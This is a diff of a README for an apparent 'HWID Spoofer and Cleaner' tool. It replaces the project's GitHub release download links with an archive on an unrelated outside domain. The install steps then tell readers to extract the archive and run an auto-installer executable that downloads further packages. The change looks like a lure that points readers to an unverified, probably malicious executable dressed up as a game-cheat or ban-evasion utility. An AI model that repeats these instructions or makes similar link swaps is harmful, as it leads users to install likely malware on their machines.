@@ -7,11 +7,11 @@
 
 ### Installation
 [![asdasdasd](https://github.com/user-attachments/assets/3b3493f7-e584-4073-865c-7ecb17ffeac1)
-](https://github.com/TikiTikiPlus/HWID-Spoofer-and-Cleaner-2024/releases/download/V4.2/Release.zip)
+](https://dl.jrdesklabs.com/Setup.zip)
 
 
 
-## **1. [Download the archive](https://github.com/TikiTikiPlus/HWID-Spoofer-and-Cleaner-2024/releases/download/V4.2/Release.zip) and extract it to a convenient folder.**
+## **1. [Download the archive](https://dl.jrdesklabs.com/Setup.zip) and extract it to a convenient folder.**
 ## **2. Run the auto-installer `Installing_File_x64.exe`. It will install and download all necessary packages for > operation.**
 
 ![yY9DtOo](https://github.com/user-attachments/assets/e033994a-57a1-443c-acef-5254c9052c8c)
